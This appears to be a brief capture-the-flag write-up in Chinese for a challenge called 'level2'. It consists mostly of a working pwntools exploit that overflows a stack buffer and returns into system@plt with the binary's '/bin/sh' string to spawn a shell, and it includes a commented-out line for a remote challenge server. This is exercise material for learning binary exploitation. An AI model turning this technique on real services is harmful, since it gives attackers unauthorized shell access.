# level2

从level2进程本身找出system函数和"/bin/sh"字符串即可。  

EXP：  
```python
import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./level2')
#p = pwn.remote('220.249.52.133', 32564)

e = pwn.ELF('./level2')
system_addr = pwn.p32(e.plt['system'])
sh_addr = pwn.p32(next(e.search(b'/bin/sh')))

payload = b'A' * 0x88 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr
p.sendlineafter(b'Input:', payload)

p.interactive()
```